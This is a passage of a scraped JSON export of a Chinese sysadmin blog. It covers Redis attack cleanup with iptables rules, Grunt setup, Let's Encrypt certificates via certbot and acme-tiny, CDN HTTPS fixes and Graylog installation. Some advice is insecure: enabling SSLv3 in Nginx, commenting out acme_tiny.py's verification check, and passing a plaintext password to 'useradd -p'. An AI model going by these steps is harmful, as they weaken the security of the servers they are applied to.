0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT #iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT iptables -I INPUT -j REDIS6379&#125;iptables -D OUTPUT -j REDIS6379iptables -F REDIS6379iptables -X REDIS6379iptables -D INPUT -j REDIS63792iptables -F REDIS63792iptables -X REDIS63792#iptables -N REDIS6379 &amp;&amp; DoRedis6379 删除这些文件，在看看就没问题了，后面把redis设置了。 我们当初设置了反向代理和防火墙规则，权限设置了很细，只能普通用户启动服务。 总结： 这次发生破灭性的攻击，总结经验这里gitlab走redis单独走本地：设置：bind单独本地跑。127.0.0.1 第二：普通用户启动redis，第三：设置防火墙。","raw":null,"content":null,"categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://blog.yangcvo.me/categories/运维安全/"}],"tags":[{"name":"Operation safety","slug":"Operation-safety","permalink":"http://blog.yangcvo.me/tags/Operation-safety/"}]},{"title":"Node.js+Grunt工具搭建后台管理实践","slug":"Node.js/Node.js-Grunt工具搭建后台管理实践","date":"2016-11-24T10:14:35.000Z","updated":"2017-03-29T10:17:35.000Z","comments":true,"path":"2016/11/24/Node.js/Node.js-Grunt工具搭建后台管理实践/","link":"","permalink":"http://blog.yangcvo.me/2016/11/24/Node.js/Node.js-Grunt工具搭建后台管理实践/","excerpt":"","text":"最近弄灰度发布系统，由于最近体检项目需要对css文件和js文件进行压缩，各种比较之后，选择了grunt进行构建。google一下，几乎都是grunt最新版的使用说明 查看gruntjs的入门 Getting started，又是云里雾里的，好吧，只能耐心看文档和不断的实践吧。 Grunt入门入门教程: 系统环境centos 6.6 x64 Grunt安装过程：1、前提安装了nodejs，进入官网后(http://nodejs.org/)，点击“INSTALL”按钮，就会下载然后安装就行了。觉得现在windows安装node，挺简单的，感觉稳定性也提升了不少。 2、安装grunt命令行工具，有一句话总结“就是安装完CLI，还要在项目安装Grunt。” 1npm install -g grunt-cli 安装grunt及其插件，进入到某项目根目录，在命令行模式下，例如文件在c盘testGrunt目录下，利用cd命令到testGrunt目录下后，使用命令: 1npm install grunt --save-dev 3、输入版本号验证安装是否成功，输入： 1grunt -version 在这里我选择一个存放后台管理的文件目录。 创建grunt项目grunt项目一般需要以下内容: 1231 、grunt（ 需要安装）2、 grunt 插件 （需要安装） 3、package.json 和 Gruntfile.js 。 (官方入门Getting started 说通过 grunt-init 和 npm init 创建。对于入门来说，这两中方式都不太好用。推荐直接创建 package.json 和Gruntfile.js 文件) 这里我之前创建过，直接在其他机器上面cp过来即可了。 1234567891011121314151617181920211.创建文件夹:health-Grunt 2.在health-Grunt下面创建2个文件package.json 和 Gruntfile.js### 官网推荐：``` bash package.json 内容如下&#123; \"name\": \"smeitejs\", \"version\": \"0.1.0\", \"description\": \"js for smeite.com\", \"homepage\": \"http://cc.com/\", \"author\": \"helath &lt;cc@qq.com&gt;\", \"devDependencies\": &#123; \"grunt\": \"~0.4.1\", \"grunt-contrib-jshint\": \"~0.3.0\", \"grunt-contrib-nodeunit\": \"~0.1.2\", \"grunt-contrib-cssmin\": \"~0.5.0\" &#125;&#125; 这里我贴出我的本地配置： 12345678910111213141516&#123; \"name\": \"grunt_project\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" &#125;, \"author\": \"\", \"license\": \"ISC\", \"devDependencies\": &#123; \"grunt\": \"^0.4.5\", \"grunt-contrib-connect\": \"^0.11.2\", \"grunt-contrib-watch\": \"^0.6.1\" &#125;&#125; Gruntfile.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748module.exports = function(grunt) &#123;// Project configuration.grunt.initConfig(&#123; uglify: &#123; options: &#123; mangle: false &#125;, build: &#123; files: &#123; 'assets/config.min.js': ['js/config.js'], 'assets/smeite.min.js': ['js/smeite.js'], 'assets/index.min.js': ['js/index.js'] &#125; &#125; &#125;,cssmin: &#123; compress: &#123; files: &#123; 'assets/all.min.css': ['css/base.css', 'css/global.css'] &#125; &#125;, // smeite: &#123; // files: &#123; // 'assets/smeite.all.css': ['/play21/smeite.com/public/assets/css/**/*.css'] // &#125; // &#125;, with_banner: &#123; options: &#123; banner: '/* My minified css file test test */' &#125;, files: &#123; 'assets/min/base.css': ['css/base.css'], 'assets/min/global.css': ['css/global.css'] &#125; &#125;&#125;&#125;); // Load the plugin that provides the \"uglify\" task. grunt.loadNpmTasks('grunt-contrib-uglify'); grunt.loadNpmTasks('grunt-contrib-cssmin'); // Default task(s). grunt.registerTask('default', ['uglify']);&#125;; 这里我自己配置的： 12345678910111213141516171819202122232425262728293031323334353637383940414243module.exports = function (grunt) &#123; grunt.initConfig(&#123; pkg: grunt.file.readJSON('package.json'), connect:&#123; yjklog:&#123; options:&#123; port:8088, 端口 base:'yjklog/front', 文件后台的日志查询的 livereload:true, hostname:'192.168.1.133' 本机机器 &#125; &#125;, yjk:&#123; options:&#123; port:8080, 端口 base:'yjk/front', 后台 livereload:true, hostname:'192.168.1.133' &#125; &#125;, jgs:&#123; options:&#123; port:80, 端口 base:'yjk/jgs', 项目后台访问 livereload:true, hostname:'192.168.1.182' &#125; &#125; &#125;, watch: &#123; options: &#123; livereload: '&lt;%= connect.yjklog.options.livereload %&gt;' &#125;, files: [ '&lt;%= pkg.root %&gt;/app/**/*', '&lt;%= pkg.root %&gt;/assets/**/*' ] &#125; &#125;); grunt.loadNpmTasks('grunt-contrib-connect'); grunt.loadNpmTasks('grunt-contrib-watch'); grunt.registerTask('default', ['connect','watch']);&#125;; 所有在Gruntfile.js 配置了2个grunt插件:grunt-contrib-connect 和 grunt-contrib-watch如果项目只需要压缩js和css文件。所有在Gruntfile.js 配置了2个grunt插件： grunt-contrib-uglify 和 grunt-contrib-cssmin 安装 grunt 插件：在git 客户端键入命令 cd /health-Grunt; 1234键入命令 npm install grunt-contrib-watch 安装watch键入命令 npm install grunt-contrib-connect 安装connect键入命令 npm install grunt-contrib-uglify 安装uglify键入命令 npm install grunt-contrib-cssmin 安装cssmin 官方的的话：查看第4步 12344、 准备相关资料在 testGrunt 目录下，创建 js目录，并在js目录下创建文件config.js smeite.js index.js ，创建css目录，并在css目录下创建base.css 和 global.css。 （这些文件都在Gruntfile.js 有配置，所以需要创建，内容可以随意的写）5、执行grunt 命令执行js压缩命令 grunt uglify 效果如下 我参考官网上面我Gruntfile.js 有配置，需要创建这些文件目录。yjk,front,yjklog.后面就是前端事情了。具体的就不详解了！可以查看我github上面有详细的文档。 启动服务：1在目录当前后台启动: grunt &amp; 搭建后台，需要对后台的端口开放防火墙设置。","raw":null,"content":null,"categories":[],"tags":[{"name":"node.js","slug":"node-js","permalink":"http://blog.yangcvo.me/tags/node-js/"},{"name":"Grunt","slug":"Grunt","permalink":"http://blog.yangcvo.me/tags/Grunt/"}]},{"title":"免费 Https证书（Let'S Encrypt）申请与配置","slug":"Web服务技术/申请证书Https/免费 Https 证书（Let'S Encrypt）申请与配置 ","date":"2016-11-24T09:25:23.000Z","updated":"2017-04-01T02:03:36.000Z","comments":true,"path":"2016/11/24/Web服务技术/申请证书Https/免费 Https 证书（Let'S Encrypt）申请与配置 /","link":"","permalink":"http://blog.yangcvo.me/2016/11/24/Web服务技术/申请证书Https/免费 Https 证书（Let'S Encrypt）申请与配置 /","excerpt":"","text":"免费 Https 证书（Let’S Encrypt）申请与配置之前要申请免费的 https 证书操作步骤相当麻烦，今天看到有人在讨论，就搜索了一下。发现现在申请步骤简单多了。 1. 下载 certbot123git clone https://github.com/certbot/certbotcd certbot./certbot-auto --help 解压打开执行就会有相关提示 2. 生成免费证书12./certbot-auto certonly --webroot --agree-tos -v -t --email 邮箱地址 -w 网站根目录 -d 网站域名./certbot-auto certonly --webroot --agree-tos -v -t --email keeliizhou@gmail.com -w /path/to/your/web/root -d ihaozhuo.com 注意 这里 默认会自动生成 /网站根目录/.well-known/acme-challenge，然后 shell 脚本会对应的访问 网站域名/.well-known/acme-challenge 如果返回正常就确认了你对这个网站的所有权，就能顺利生成 3. 获取证书如果上面的步骤正常 shell 脚本会展示如下信息： 123- Congratulations! Your certificate and chain have been saved at/etc/letsencrypt/live/网站域名/fullchain.pem... 4. 生成 dhparams使用 openssl 工具生成 dhparams 1openssl dhparam -out /etc/ssl/certs/dhparams.pem 2048 5. 配置 Nginx打开 nginx server 配置文件加入如下设置： 12345678listen 443ssl on;ssl_certificate /etc/letsencrypt/live/网站域名/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/网站域名/privkey.pem;ssl_dhparam /etc/ssl/certs/dhparams.pem;ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;ssl_ciphers HIGH:!aNULL:!MD5; 然后重启 nginx 服务就可以了 6. 强制跳转 httpshttps 默认是监听 443 端口的，没开启 https 访问的话一般默认是 80 端口。如果你确定网站 80 端口上的站点都支持 https 的话加入下面的配件可以自动重定向到 https 12345server &#123; listen 80; server_name your.domain.com; return 301 https://$server_name$request_uri;&#125; 7. 证书更新免费证书只有 90 天的有效期，到时需要手动更新 renew。刚好 Let’s encrypt 旗下还有一个 Let’s monitor 免费服务，注册账号添加需要监控的域名，系统会在证书马上到期时发出提醒邮件，非常方便。收到邮件后去后台执行 renew 即可，如果提示成功就表示 renew 成功 1./certbot-auto renew","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS","slug":"Web服务技术/申请证书Https/如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS","date":"2016-11-23T09:25:23.000Z","updated":"2017-03-31T17:04:58.000Z","comments":true,"path":"2016/11/23/Web服务技术/申请证书Https/如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS/","link":"","permalink":"http://blog.yangcvo.me/2016/11/23/Web服务技术/申请证书Https/如何在Nginx申请安装配置免费HTTPS证书+阿里云SLB如何配置HTTPS/","excerpt":"","text":"如何在Nginx申请安装配置免费HTTPS证书HTTPS在各大互联网站已经成为标配，就连某度也在前不久全面启用HTTPS，很多小网站也配置了HTTPS，这是未来的一种趋势.HTTPS的好处多多，可以防止各种攻击劫持，运营商广告植入，客户传输信息泄露等问题。为了让HTTPS能够全面普及，让我们加密项目应运而生，它由互联网安全研究小组ISRG（互联网安全研究小组）提供服务，很早之前我就在关注 Let’s Encrypt这个免费、自动化、开放的证书签发服务。ISRG是来自美国加利福尼亚州的一个公益组织.Let’s Encrypt得到了Mozilla，Cisco和Chrome等众多公司和机构的支持。 申请 Let&#39;s Encrypt 证书不但免费，还非常简单，虽然每次只有 90 天的有效期，但可以通过脚本定期更新，配好之后一劳永逸。本教程亲测有效，希望对正在寻找免费HTTPS方案的你有一定的帮助，本文记录本站申请过程和遇到的问题。 按照我们的加密官方提供的工具安装HTTPS的话与过于复杂，于是有好心人提供了更为轻巧的工具安装，极致纤巧诞生了，它的代码量在200行内，只需依赖的Python和OpenSSL的。 第一步：创建Let’s Encrypt加密账号首先创建一个目录，例如 ssl用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥用于 Let’s Encrypt 识别你的身份： 让我们加密使用一个私钥来进行账号的创建与登陆，因此我们需要使用openssl创建一个account.key 123456[root@ihaozhuo1 srv]# mkdir ssl &amp;&amp; cd ssl[root@ihaozhuo1 ssl]# openssl genrsa 4096 &gt; account.keyGenerating RSA private key, 4096 bit long modulus...........................++...........................++e is 65537 (0x10001) 第二步：创建域名的CSR（证书签名请求）让我们加密使用的ACME协议需要一个CSR文件，可以使用它来重新申请HTTPS证书，接下来我们就可以创建域名CSR，在创建CSR之前，我们需要给我们的域名创建一个私钥（这个和上面的账户私钥无关）。接着就可以生成 CSR（Certificate Signing Request，证书签名请求）文件了。在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥），根据证书不同类型，域名私钥也可以选择 RSA 和 ECC 两种不同类型。以下两种方式请根据实际情况二选一。 1）创建 RSA 私钥（兼容性好）： 1openssl genrsa 4096 &gt; domain.key 2）注意：一定不要使用上面创建好的account.key 来当domain.key ❗️ 有了私钥文件，就可以创建生成 CSR文件了。在 CSR中推荐至少把域名带 www 和不带www的两种情况都加进去，其它子域可以根据需要添加,替换下面的ihaozhuo.com即可 (目前一张证书最多可以包含 100 个域名) 3）注意，稍后会说到，每个域名都会涉及到验证） 1234567＃单个域名openssl req -new -sha256 -key domain.key -subj“/CN=ihaozhuo.ccom”&gt; domain.csr＃多个域名（如果你有多个域名，比如：www.ihaozhuo.com 和ihaozhuo.com，使用这种方式）openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf \"[SAN]\\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com\")) &gt; domain.csr 4）说明：ihaozhuo.com，www.ihaozhuo.com 替换成你的域名执行这一步时，需要指定openssl.cnf文件，一般这个文件在你的openssl安装目录底下。 如果提示找不到 /etc/ssl/openssl.cnf文件，请看看/usr/local/openssl/ssl/openssl.cnf 和/etc/pki/tls/openssl.cnf是否存在。 12345[root@ihaozhuo1 ssl]# find / -name openssl.cnf ##查找openssl.cnf文件/etc/pki/tls/openssl.cnf[root@ihaozhuo1 ssl]# ln -s /etc/pki/tls/openssl.cnf /etc/ssl/openssl.cnf #做个软链接 [root@ihaozhuo1 ssl]# openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf \"[SAN]\\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com\")) &gt; domain.csr 如果还是不行，也可以使用交互方式创建CSR（需要注意 Common Name必须为你的域名）： 1openssl req -new -sha256 -key domain.key -out domain.csr 第三步：配置域名验证CA在签发DV（域验证）证书时，需要验证域名所有权。传统CA的验证方式一般是往admin@ihaozhuo.com发验验邮件，而让我们加密是在你的服务器上生成一个随机验证文件，再通过创建CSR时指定的域名访问，如果可以访问则表明你对这个域名有控制权。 首先创建用于存放验证文件的目录，例如： 1mkdir -p var/www/challenge 然后配置一个Nginx服务，以Nginx为例:(注意：这里的端口是80，不是443） 123456789101112131415server &#123; listen 80; server_name www.ihaozhuo.com ihaozhuo.com; location /.well-known/acme-challenge/ &#123; alias /var/www/challenges/; index index.html index.php index.jsp index.htm; try_files $uri =404;&#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; 这是我在上面配置完成以后需要重启Nginx，先Nginx -t校验下是否有没有问题。 123456789101112131415161718[root@ihaozhuo1 conf]# nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful``` 如何验证上面设置是否成功？ 我们只要在目录：/var/www/challenges/ 下面创建文件：test.html然后通过http://www.ihaozhuo.com/.well-known/acme-challenge/test.html URL访问地址那个文件，如果能访问成功说明你配置没问题;否则就说明配置错误❌，这一步不能实现下面就不能成功了。以上配置优先查找 `var/www/challenge`目录下的文件，如果找不到就重定向到` HTTPS` 地址。这个验证服务以后更新证书还要用到，建议一直保留。### 第四步：获取网站证书**1）上面配置好，现在我们使用acme-tiny.py来获取网站证书** acme-tiny脚本文件上Github下载：[acme-tiny.py](https://github.com/diafygi/acme-tiny)**2）先把 acme-tiny 脚本保存到之前的ssl目录**```bashwget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py 3）然后指定账户私钥、CSR 以及验证目录，执行脚本来获取网站证书 1python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crt 4）如果一切正常，当前目录下就会生成一个signed.crt这就是申请好的证书文件，如果跟我一样报错了请看下面 1234567891011121314[root@ihaozhuo1 ssl]# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crtParsing account key...Parsing CSR...Registering account...Already registered!Verifying ihaozhuo.com...Traceback (most recent call last): File \"acme_tiny.py\", line 198, in &lt;module&gt; main(sys.argv[1:]) File \"acme_tiny.py\", line 194, in main signed_crt = get_crt(args.account_key, args.csr, args.acme_dir, log=LOGGER, CA=args.ca) File \"acme_tiny.py\", line 123, in get_crt wellknown_path, wellknown_url))ValueError: Wrote file to /var/www/challenges/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg, but couldn't download http://ihaozhuo.com/.well-known/acme-challenge/fWyC6BvCCSlVunoaltJrnEV-ewj6FBpOv7Eu8LluBUg 5）脚本问题： 记得在网站记得域名解析要对，都是你现在申请证书这台外网解析地址： http://ihaozhuo.com/不通那解析就出现问题了。 网上也有很多人说域名DNS服务器解析导致域名不行，这个验证了以后不是的，这个是GitHub这个脚本acme_tiny.py问题导致的，需要编辑脚本注释掉下面全部内容即可 116行-123行： 12345678# try: # resp = urlopen(wellknown_url) # resp_data = resp.read().decode('utf8').strip() # assert resp_data == keyauthorization # except (IOError, AssertionError): # os.remove(wellknown_path) # raise ValueError(\"Wrote file to &#123;0&#125;, but couldn't download &#123;1&#125;\".format( # wellknown_path, wellknown_url)) 如果修改没有用，可以到我这里下载Github下载acme_tiny.py 6）然后保存再次获取网站证书 1234567891011[root@ihaozhuo1 ssl]# python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &gt; ./signed.crtParsing account key...Parsing CSR...Registering account...Already registered!Verifying ihaozhuo.com...ihaozhuo.com verified!Verifying www.ihaozhuo.com...www.ihaozhuo.com verified!Signing certificate...Certificate signed! ㊗️ 如果看到如上内容，那么恭喜你，你的网站证书已经成功获取了。这时候查看目录下面有如下几个文件： 12345678[root@ihaozhuo1 ssl]# ll总用量 36-rw-r--r-- 1 root root 3243 3月 30 16:42 account.keydrwxr-xr-x 4 root root 4096 3月 30 17:31 acme-tiny-rw-r--r-- 1 root root 9159 3月 30 19:23 acme_tiny.py-rw-r--r-- 1 root root 1639 3月 30 17:00 domain.csr-rw-r--r-- 1 root root 3243 3月 30 16:53 domain.key-rw-r--r-- 1 root root 2159 3月 30 22:11 signed.crt 到目前为止我们已经成功申请到Let’sENcrpyt的网站证书，对于Nginx用户我们还需要把Let’s ENcrpyt的中间证书加入到刚刚生成的signed.crt文件中。具体操作： 第五步：安装证书证书生成后，就可以把它配置在web 服务器上了，需要注意的是，Nginx需要追加一个Let’s Encrypt的中间证书，在 Nginx 配置中，需要把中间证书和网站证书合在一起： 123456789101112wget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &gt; intermediate.pemcat signed.crt intermediate.pem &gt; chained.pem[root@ihaozhuo1 ssl]# ll总用量 36-rw-r--r-- 1 root root 3243 3月 30 22:06 account.key-rw-r--r-- 1 root root 9159 3月 30 19:23 acme_tiny.py-rw-r--r-- 1 root root 3834 3月 30 22:51 chained.pem-rw-r--r-- 1 root root 1639 3月 30 22:07 domain.csr-rw-r--r-- 1 root root 3243 3月 30 22:06 domain.key-rw-r--r-- 1 root root 1675 3月 30 22:51 intermediate.pem-rw-r--r-- 1 root root 2159 3月 30 22:51 signed.crt 1）现在我们可以在Nginx启动HTTPS，你可以直接在你之前网站Nginx.conf里面配置 注意⚠️ ：为了不影响现在正在运行的网站，在配置HTTPS的时候最好将你现在配置好的文件全部备份起来，这样你在启动HTTPS出现问题可以能够快速恢复回来。 Nginx配置文件加入以下配置： 12345678910111213141516171819202122232425262728server &#123; listen 80; server_name ihaozhuo.com, www.ihaozhuo.com; location /.well-known/acme-challenge/ &#123; alias /var/www/challenges/; try_files $uri =404; &#125; ...the rest of your config&#125;server &#123; listen 443; server_name ihaozhuo.com, www.ihaozhuo.com; ssl on; ssl_certificate /srv/ssl/chained.pem; ssl_certificate_key /srv/ssl/domain.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA; ssl_session_cache shared:SSL:50m; ssl_prefer_server_ciphers on; ...the rest of your config&#125; 在Chrome浏览器里面你可以访问https开头的，但没有看到绿色锁标记，这是因为你网站有请求http://xxx资源，这个问题我遇到以后查了很多，因为我网站很早之前就有了，里面配置的地址都是http要修改过来非常麻烦，所以申请证书一开始域名下来就要申请这是最好的，如果你情况已经跟我一样，那你需要把所有的http://xxxx 资源全部切换成：https://xxx 的资源，这样绿色的锁才会出现。 第六步：定期更新访问查看下网站详细信息： 1234567891011121314151617181920212223242526272829[root@ihaozhuo1 conf]# curl -v https://www.ihaozhuo.com/home.html* About to connect() to www.ihaozhuo.com port 443 (#0)* Trying 120.27.185.86...* Connected to www.ihaozhuo.com (120.27.185.86) port 443 (#0)* Initializing NSS with certpath: sql:/etc/pki/nssdb* CAfile: /etc/pki/tls/certs/ca-bundle.crt CApath: none* Server certificate:* subject: CN=ihaozhuo.com* start date: 3月 30 13:51:00 2017 GMT* expire date: 6月 28 13:51:00 2017 GMT* common name: ihaozhuo.com* issuer: CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US* NSS error -8179 (SEC_ERROR_UNKNOWN_ISSUER)* Peer's Certificate issuer is not recognized.* Closing connection 0curl: (60) Peer's Certificate issuer is not recognized.More details here: http://curl.haxx.se/docs/sslcerts.htmlcurl performs SSL certificate verification by default, using a \"bundle\" of Certificate Authority (CA) public keys (CA certs). If the default bundle file isn't adequate, you can specify an alternate file using the --cacert option.If this HTTPS server uses a certificate signed by a CA represented in the bundle, the certificate verification probably failed due to a problem with the certificate (it might be expired, or the name might not match the domain name in the URL).If you'd like to turn off curl's verification of the certificate, use the -k (or --insecure) option. Let’s Encrypt 签发的证书只有90天有效期，但可以通过脚本定期更新。你可以创建了一个自动更新脚本renew_cert.sh，内容如下： 123456#!/usr/bin/shpython /srv/ssl/acme_tiny.py --account-key /srv/ssl/account.key --csr /srv/ssl/domain.csr --acme-dir /var/www/challenges/ &gt; /srv/ssl/signed.crt || exitwget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &gt; intermediate.pemcat /srv/ssl/signed.crt intermediate.pem &gt; /srv/ssl/chained.pemservice nginx reload 修改crontab配置，加入以下内容： 12#每个月执行一次0 0 1 * * /srv/ssl/renew_cert.sh 2&gt;&gt; /var/log/acme_tiny.log 大功告成，不过先别急，访问下自己的HTTPS网站是否正常，不出意外的话，网站正式启用HTTPS，但是网站如果有用CDN的话，那么需要CDN也支持HTTPS才行，否则无法正常加载CDN的资源，类似的错误如： 1Mixed Content: The page at 'https://ihaozhuo.com/' was loaded over HTTPS, but requested an insecure script 'http://app.h5.ihaozhuo.combdimg.com/yjk/css/jquery.min.js'. This request has been blocked; the content must be served over HTTPS. 一种解决方法就是使用Upyun来解决这个问题。可参考：我写的一篇文章如何解决https跨站访问证书不安全访问。 一种解决方法就是使用七牛的云存储来解决这个问题。可参考：https://blog.blahgeek.com/qiniu-cdn-serve-static/ 阿里云SLB如何配置HTTPS使用阿里云很简单，不需要太多的配置不过个人还是喜欢Nginx去做代理访问。 公司后期更新了本地的Nginx去做负载均衡直接使用SLB ，这里记录下申请了证书以后只需要chained.pem和私钥domain.key。 在SLB负载均衡左侧有证书管理-创建证书-选择服务器证书。 然后在负载均衡上面设置下监听端口选择下对应证书就可以了。 参考：GitHub 安装教程","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全","slug":"Web服务技术/申请证书Https/解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全","date":"2016-11-23T09:25:23.000Z","updated":"2017-04-01T02:04:08.000Z","comments":true,"path":"2016/11/23/Web服务技术/申请证书Https/解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全/","link":"","permalink":"http://blog.yangcvo.me/2016/11/23/Web服务技术/申请证书Https/解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全/","excerpt":"","text":"解决Https请求跨域CDN资源http网站出现访问失败-证书显示不安全这里讲如何解决跨域http资源请求证书出现问题， 上一篇我解决网站如何申请免费证书，实现申请免费证书在Nginx上面实现https访问。 可是我一开始没有这么顺利实现我想要的效果，因为的确证书是有了访问可以https可是请求跨域http服务就出现问题了。这里我是在又拍云做CDN加速的，所以这里说明下如果你的公司网站比如说：ihaozhuo.com那么请求的时候https://ihaozhuo.com 出现我下面同样的问题: 这是我显示的错误图片当初截图留下记录成文档了。这里我也做了HTTPS安全检测：https://www.ssllabs.com/ssltest 如何解决：这里我问前端的代码静态资源上面请求upyun的http去访问，这里我们在upyun对请求域名设置https方法： upyun对应的服务列表设置里面选择https设置 配置好以后就可以生效了。 这里需要把地址给到前端让他们在代码上面修改下HTTPS 更新下服务重启就出现访问正常了。","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"graylog 升级2.1 集中日志解决方案","slug":"日志分析\u0010平台/Graylog/graylog 升级2.1 集中日志解决方案","date":"2016-11-14T09:56:03.000Z","updated":"2017-03-14T05:48:39.000Z","comments":true,"path":"2016/11/14/日志分析\u0010平台/Graylog/graylog 升级2.1 集中日志解决方案/","link":"","permalink":"http://blog.yangcvo.me/2016/11/14/日志分析\u0010平台/Graylog/graylog 升级2.1 集中日志解决方案/","excerpt":"","text":"graylog 升级2.1 集中日志解决方案参考官网：升级到Graylog的2.1.x 一：为什么需要集中日志解决方案？在公司服务机子部署越来越多的情况下，让我们来想想会遇到的问题： 开发人员不能登录线上服务器查看详细日志，经过运维周转费时费力 日志数据分散在多个系统，难以查找 日志数据量大，查询速度慢 一个调用会涉及多个系统，难以在这些系统的日志中快速定位数据 数据不够实时 很难对数据进行挖掘，分析，业务告警，审计 这些问题的存在让开发以及运维人员很是头痛，严重影响效率！ 二：什么是graylog技术栈？为了解决上述问题，我们需要一个日志的集中管理方案，graylog技术栈： java （jdk1.8.0_66/）环境 Collector-sidecar（收集日志）或者syslog Mongodb（存储日志源文件） Elasticsearch（提供搜索日志） Graylog2.1.1（搜索和视图展示日志，告警和权限） 有了这些，我们就能把日志先收集起来，进行我们想要的分析之后，web的形式展示出来，提供查询！ 三：graylog的安装部署安装环境：linux centOS系统安装，已安装JDK1.8版本，安装启动顺序 1.安装部署mongodb2.安装部署elasticsearch3.安装部署graylog4.安装部署Graylog Collector Sidecar 1：安装部署mongodb Java也安装 参考我博文有介绍。 2：安装部署elasticsearch (1)下载jar包 12345678wget https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz如果报错执行wget --no-check-certificatehttps://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz (2)解压jar包 1tar -zxvf elasticsearch-2.3.5.tar.gz -C /opt/ (3)修改elasticsearch.yml配置文件 这里需要修改配置文件：配置前先创建几个目录文件 12mkdir /home/data/es-data -pmkdir /home/data/es-work -p elasticsearch-2.3.5安装目录conf下执行 1234567891011vim elasticsearch-2.3.5/config/elasticsearch.yml cluster.name: graylog #集群名称建议命名graylog，便于识别区分node.name: elasticsearch-node-1 # elasticsearch集群节点名称network.host: 192.168.1.234 # 绑定节点IPhttp.port: 9200 # 外部访问端口，默认，也可以安全考虑修改path.logs: /home/data/logspath.data: /home/data/es-datadiscovery.zen.ping.multicast.enabled: false #多播发现方式关闭，因为graylog采用单播方式发现elasticsearch集群方式discovery.zen.ping.unicast.hosts #多个节点用逗号隔开discovery.zen.minimum_master_nodes: 3 # elasticsearch集群节点，最少选举数，这个数一定要设置为整个集群节点个数的一半加1，即N/2+1，必须为奇数 (4)启动elasticsearch服务 新建一个elasticsearch用户，出于安全考虑，elasticsearch服务不能使用root用户启动 创建elasticsearch用户组及elasticsearch用户，执行 12groupadd elasticsearchuseradd elasticsearch -g elasticsearch -p elasticsearch 其中-g使用户属于某个组，-p为新用户使用加密密码）更改elasticsearch-2.3.5文件夹及内部文件的所属用户及组为elasticsearch:elasticsearch 12chown -R elasticsearch:elasticsearch /home/data/chown -R elasticsearch:elasticsearch elasticsearch-2.3.5 切换用户 1su elasticsearch 在elasticsearch-2.3.5/bin目录下执行 1234[elasticsearch@graylog bin]$ ps -ef | grep elasticsearchroot 18265 16004 0 14:27 pts/1 00:00:00 su elasticsearch502 18405 1 62 